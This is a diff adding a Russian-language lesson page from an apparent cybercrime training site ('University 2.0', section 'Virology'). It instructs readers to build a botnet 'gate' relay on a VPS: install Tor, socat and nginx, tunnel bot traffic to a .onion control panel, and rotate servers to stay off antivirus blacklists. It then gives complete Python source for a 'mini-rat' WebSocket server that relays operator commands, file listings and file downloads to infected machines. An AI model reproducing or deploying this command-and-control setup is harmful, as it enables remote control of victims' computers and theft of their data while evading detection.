@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+
+
+<div class="banner_block" style="background-image:url('source/virusology.jpeg')">
+        <div class="banner_content">
+            <h2>Фреймворки</h2>
+            <p>Вирусология</p>
+            <p>Зголовок обновика</p>
+        </div>
+    </div>
+    <br>
+
+            
+
+            
+    <div class="article_actions">
+        <a href="virus.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+    
+ <div class="text_content">
+        <p>Гейт нужен для того, чтобы можно было привязать ботов к панели через свой сервер. Время использование одного сервера влияет на детекты. IP сервера, который активно используется, со временем попадает в блек-листы антивирусов. Для настройки подойдёт любой VPS на debian или ubuntu. При нагрузке меньше 500 ботов можно брать сервер с минимальной производительностью. Желательные характеристики - 1 ГБ оперативки(количество места на диске не важно)</p>
+
+<p>&nbsp;</p>
+
+<h2 style="text-align:center">Установка</h2>
+
+<h3>TOR</h3>
+
+<p>Для начала надо попробовать установить его командой</p>
+
+<pre>
+<code>apt-get -y install tor</code></pre>
+
+<p>Если не появится сообщение <code>E: Unable to locate package tor</code> или <code>E: Package &#39;tor&#39; has no installation candidate</code>, то установка tor прошла успешно и можно переходить к следующему пункту. В случае появление ошибки <code>apt-get: command not fond</code> надо либо установить apt в систему, либо поменять дистрибутив. Обычно систему у VPS можно переустановить в его панели управления. Лучше всего подойдёт <code>debian</code> или ubuntu <code>server</code>.</p>
+
+<p>Тем, у кого тор не поставился, надо отредактировать источники apt. Сделать это можно через консольный редактор <code>nano</code>. Зайдите на сайт <a href="https://www.torproject.org/docs/debian.html.en">torproject</a> и из выпадающих меню выберите версию сервера(или наиболее близкую к ней). Затем скопируйте 2 строки под списками и на выполните на сервере команду</p>
+
+<pre>
+<code>nano /etc/apt/sources.list</code></pre>
+
+<p>Перейдите в самый низ и с новой строки вставьте данные с сайта. После этого сохраните файл комбинацией <code>Ctrl + O</code> и зактойте редактор через <code>Ctrl + X</code>.</p>
+
+<p>После этого надо добавить ключи для новых репозиториев командами</p>
+
+<pre>
+<code>gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89
+gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -</code></pre>
+
+<p>И наконец установить необходимый пакет</p>
+
+<pre>
+<code>apt-get update
+apt-get -y install tor deb.torproject.org-keyring</code></pre>
+
+<h3>socat</h3>
+
+<p>В некоторых дистрибутивах он предустановлен. Чтобы проверить, есть ли он, достаточно набрать в консоли <code>socat</code>, и если вернётся текст со словами <code>exactly 2 addresses required</code>, то этот пункт можно пропустить</p>
+
+<pre>
+<code>apt-get -y install socat</code></pre>
+
+<p>&nbsp;nginx</p>
+
+<pre>
+<code>apt-get -y install nginx</code></pre>
+
+<h3>screen</h3>
+
+<p>Он также часто уже есть. Чтобы проверить, достаточно набрать <code>screen</code>. Если не появится ошибки, то надо нажать enter и выполнить команду <code>exit</code></p>
+
+<pre>
+<code>apt-get -y install screen</code></pre>
+
+<h2 style="text-align:center">&nbsp;</h2>
+
+<h2 style="text-align:center">Конфигурация</h2>
+
+<h3>Туннель к панели</h3>
+
+<p>Это способ перенаправлять поступающие данные на .onion сервис. Для начала надо создать под него <code>screen</code>, чтобы он не занимал терминальную сессию. Для его создания надо выполнить команду</p>
+
+<pre>
+<code>screen -S tunnel</code></pre>
+
+<p>В появившемся терминале надо выполнить команду</p>
+
+<pre>
+<code>socat tcp4-LISTEN:6671,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:abc.onion:80,socksport=9050</code></pre>
+
+<p>После чего можно выйти нажав <code>Ctrl + A</code> затем <code>Ctrl + D</code></p>
+
+<p>Форвардинг</p>
+
+<p>Открываем в редакторе файл конфига сервера командой</p>
+
+<pre>
+<code>nano /etc/nginx/nginx.conf</code></pre>
+
+<p>Тут надо найти строку, которая начинается с <code>http {</code> и после неё вставить это</p>
+
+<pre>
+<code>server{
+        proxy_connect_timeout       300;
+        proxy_send_timeout          300;
+        proxy_read_timeout          300;
+        send_timeout                300;
+
+        listen 81;
+        client_max_body_size 512M;
+
+        location / {
+                proxy_pass http://127.0.0.1:6671/raw_in/;
+                proxy_set_header Host $host;
+                proxy_set_header X-Real-IP $remote_addr;
+                proxy_set_header X-Forwarded-For $remote_addr;
+
+                # GATE SETTINGS
+                proxy_set_header Gate-ID private_name;
+                proxy_set_header Gate-Secret 12345678987654;
+        }
+}</code></pre>
+
+<p><code>12345678987654</code> в строке <code>proxy_set_header Gate-Secret</code> надо заменить на свой персональный ключ(если нет, обратитесь к поддержке). <code>private_name</code> надо заменить на случайное слово из цифр и букв в 6-12 символов длиной(например, HF87KbbeR9).</p>
+
+<p>Используя <code>Gate-ID</code> можно управлять ботами через гейт. Знание <code>Gate-Secret</code> подтверждает право владение данными с ноды и его значения не должен никому разглашаться.</p>
+
+<p>После всех изменений файл надо сохранить <code>Ctrl + O</code>, <code>Enter</code> и выйти <code>Ctrl + X</code>.</p>
+
+<p>&nbsp;</p>
+
+<h2 style="text-align:center">Модули</h2>
+
+<h3>mini-rat</h3>
+
+<p>Для работы этого модуля требуется дополнительная настройка. Сначала надо убедиться, что в системе есть python 2. В консоли надо написать</p>
+
+<pre>
+<code>python -V</code></pre>
+
+<p>Должно вернуть</p>
+
+<pre>
+<code>Python 2.*.*</code></pre>
+
+<p>(последние 2 цифры могут быть любыми), то он уже установлен. Если первая цифра версии 3, попробуйте исполнить команду <code>python2 -V</code>. Если она вернёт правильный результат далее по инструкции пишите всегда её вместо просто <code>python</code></p>
+
+<p>Затем надо проверить, что в системе есть pip. Выполняем команду</p>
+
+<pre>
+<code>pip -V</code></pre>
+
+<p>Должно вернуть что-то вроде</p>
+
+<pre>
+<code>pip *.*.* from /usr/...</code></pre>
+
+<p>Если результат другой, ставим pip командой</p>
+
+<pre>
+<code>apt-get install python-pip</code></pre>
+
+<p>&mdash; Устанавливаем git для загрузки стороннего модуля python</p>
+
+<pre>
+<code>apt-get install -y git</code></pre>
+
+<p>Настройка зависимостей: ставим необходимый пакет в pip командой</p>
+
+<pre>
+<code>pip install git+https://github.com/dpallot/simple-websocket-server.git</code></pre>
+
+<p>После всех настроек создаём скрипт, который будет принимать соединения mini-rat</p>
+
+<pre>
+<code>touch ratserver.py
+nano ratserver.py</code></pre>
+
+<p>Вставляем туда содержимое</p>
+
+<pre>
+<code>from SimpleWebSocketServer import SimpleWebSocketServer, WebSocket
+import json
+import sys
+
+secret = sys.argv[2]
+
+init_pool = []
+auth_pool = []
+admin_pool = []
+pool = {}
+
+class Broker (WebSocket):
+        def admin_cmd(self, command, **kwargs):
+                if(command == 'cmd'):
+                        try:
+                                pool[kwargs['target']].sendMessage('cmd,'+kwargs['data'])
+                                return None
+                        except KeyError:
+                                pass
+                elif command == 'list':
+                        return "list,"+','.join(pool.keys())
+                elif command == 'ping':
+                        try:
+                                pool[kwargs['target']].sendMessage("ping".decode())
+                                print("Ping", kwargs['target'])
+                        except KeyError:
+                                pass
+                        return None
+                elif command == 'ls':
+                        try:
+                                pool[kwargs['target']].sendMessage("list,"+kwargs['path'])
+                        except KeyError:
+                                pass
+                        return None
+                elif command == 'download':
+                        try:
+                                pool[kwargs['target']].sendMessage("download,"+kwargs['path'])
+                        except KeyError:
+                                pass
+                        return None
+
+                return "unknown_command"
+
+        def handleMessage(self):
+                if self.admin:
+                        data = json.loads(self.data)
+                        result = self.admin_cmd(**data)
+                        if result:
+                                if sys.version_info &gt;= (3, 0):
+                                        self.sendMessage('0,'+result)
+                                else:
+                                        self.sendMessage('0,'+result.decode())
+                        return
+                if self in init_pool:
+                        id = self.data
+                        if id == 'auth_challange_loop':
+                                # init_pool.remove(self)
+                                auth_pool.append(self)
+                                print("Entered auth challange mode")
+                                return
+                        if id == secret:
+                                print("Admin access granted")
+                                self.admin = True
+                                admin_pool.append(self)
+                                if self in auth_pool:
+                                        self.sendMessage("0,auth,true".decode())
+                                return
+                        if self in auth_pool:
+                                print("Auth failed")
+                                self.sendMessage("0,auth,false".decode())
+                                return
+                        print("Assign ID", id)
+                        pool[id] = self
+                        self.ID = id
+                        init_pool.remove(self)
+                        for admin in admin_pool:
+                                admin.sendMessage('0,connected,'+self.ID)
+                else:
+                        for admin in admin_pool:
+                                admin.sendMessage(self.ID+','+self.data)
+
+        def handleConnected(self):
+                print(self.address, 'connected')
+                self.admin = False
+                self.ID = None
+                init_pool.append(self)
+
+        def handleClose(self):
+                if self in auth_pool:
+                        auth_pool.remove(self)
+                if self in admin_pool:
+                        admin_pool.remove(self)
+                if self.ID in pool:
+                        for admin in admin_pool:
+                                admin.sendMessage('0,disconnected,'+self.ID)
+                        del pool[self.ID]
+                if self in init_pool:
+                        init_pool.remove(self)
+                print(self.address, 'disconnected')
+                # admin_pool = {key:val for key, val in admin_pool.items() if val != self}
+                # pool = {key:val for key, val in pool.items() if val != self}
+
+server = SimpleWebSocketServer('', int(sys.argv[1]), Broker)
+server.serveforever()</code></pre>
+
+<p>Сохраняем и выходим комбинациями <code>CTRL+O</code>, <code>ENTER</code>, <code>CTRL+X</code></p>
+
+<p>Сейчас и каждый раз после перезапуска сервера надо запускать скрипт в скрине. Для этого создаём скрин командой</p>
+
+<pre>
+<code>screen -S ratserver</code></pre>
+
+<p>И выполняем там команду</p>
+
+<pre>
+<code>python ratserver.py 1100 PASSWORD</code></pre>
+
+<p>Где password надо заменить на любой пароль. Он будет использоваться при входе в интерфейс mini-rat. После запуска команды выходим из скрина комбинацией <code>Ctrl + D</code>, <code>Ctrl + A</code></p>
+
+<h3>Проверка</h3>
+
+<p>Для проверки работы заходим по адресу http://IP_SERVER:81/hello_test</p>
+    </div>
+    <br>
+
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
